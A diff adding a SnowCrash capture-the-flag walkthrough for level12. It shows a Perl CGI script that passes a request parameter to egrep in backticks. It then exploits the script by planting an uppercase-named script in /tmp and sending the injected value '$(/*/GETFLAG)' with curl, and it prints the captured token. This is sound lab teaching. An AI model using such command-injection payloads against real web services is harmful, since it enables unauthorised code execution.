@@ -1169,3 +1169,113 @@ level12@SnowCrash:~$
 ```
 
 </details>
+
+## level12
+
+<details>
+
+<summary>Explanations</summary>
+
+###
+
+This time we have a Perl script:
+```Perl
+level12@SnowCrash:~$ cat level12.pl 
+#!/usr/bin/env perl
+# localhost:4646
+use CGI qw{param};
+print "Content-type: text/html\n\n";
+
+sub t {
+  $nn = $_[1];
+  $xx = $_[0];
+  $xx =~ tr/a-z/A-Z/; 
+  $xx =~ s/\s.*//;
+  @output = `egrep "^$xx" /tmp/xd 2>&1`;
+  foreach $line (@output) {
+      ($f, $s) = split(/:/, $line);
+      if($s =~ $nn) {
+          return 1;
+      }
+  }
+  return 0;
+}
+
+sub n {
+  if($_[0] == 1) {
+      print("..");
+  } else {
+      print(".");
+  }    
+}
+
+n(t(param("x"), param("y")));
+```
+
+It is like level 4, so let's make a request to ``localhost:4646``:
+```bash
+level12@SnowCrash:~$ curl localhost:4646
+..level12@SnowCrash:~$ 
+```
+
+It just prints 2 ``.`` without newline. So let look at the code.
+
+The first thing the code does is calling a ``t`` function. And this is actually the only function we will care about.
+
+Important note: the script takes a ``x`` and a ``y`` param in the request. We can see it by ``param("x")`` and ``param("y")``.
+
+First thing in this function, we gather the args:
+```Perl
+$nn = $_[1];
+$xx = $_[0];
+```
+
+``$xx`` is the first arg that we pass in ``t``, which is the param ``x``.
+``$nn`` is the second arg that we pass in ``t``, which is the param ``y``.
+
+And from there we don't touch to ``$nn`` anymore, however, the script is going to modify ``$xx``:
+```Perl
+$xx =~ tr/a-z/A-Z/; 
+$xx =~ s/\s.*//;
+```
+
+What happen is:
+- ``$xx =~ tr/a-z/A-Z/;``: transform all ``$xx`` **lowercases** in **uppercases**.
+- ``$xx =~ s/\s.*//;``: delete all characters of ``$xx`` after the first space encountered.
+
+If we send something like ``/bin/getflag > /tmp/flag``, it will be transformed as ``/BIN/GETFLAG``
+
+Next line is the most important one: ``@output = `egrep "^$xx" /tmp/xd 2>&1`;``
+
+What this line is supposed to do is run the command ``egrep`` with **OUR** arg in the file ``/tmp/xd``. But exactly as the previous levels with ``echo``, we can force the code to run another command. This time it is quite different since our arg is behind modified. Everything is going to be in uppercases, and we can only do it in one string, no space or it's going to be deleted.
+
+### Retrieving the token
+
+The strategy first is going to have a script named with only uppercases, like ``GETFLAG``, so even with the transformation, it will be executable.
+
+This script will run everything ``/bin/getflag > /tmp/flag``. This way, we can avoid everything being deleted after the first space. We also need to give the permission to execute the script: ``chmod +x /tmp/GETFLAG``.
+
+Now we need to bypass the path ``/tmp`` when running the script ``/tmp/GETFLAG``. To bypass that, we can actually use ``*``. It is going to search in all files a file named ``GETFLAG``, and this ``/tmp/GETFLAG`` is the only one, there is no problem with doing that.
+
+Our command will look like this: ``/*/GETFLAG``. But if we just use this in the ``x`` param, it's going to be interpreted as text. So we need to do like we did in a previous level with ``$()``. Which gives us ``$(/*/GETFLAG)``.
+
+Let's try all of that:
+```bash
+level12@SnowCrash:~$ echo "/bin/getflag > /tmp/flag" > /tmp/GETFLAG
+level12@SnowCrash:~$ chmod +x /tmp/GETFLAG
+level12@SnowCrash:~$ curl 'localhost:4646/?x=$(/*/GETFLAG)'
+..level12@SnowCrash:~$ cat /tmp/flag
+Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
+level12@SnowCrash:~$ 
+```
+
+And we got our token! Let's try it out:
+```bash
+level12@SnowCrash:~$ su level13
+Password: 
+level13@SnowCrash:~$ 
+```
+
+Valid token, let's go on the next level.
+
+</details>
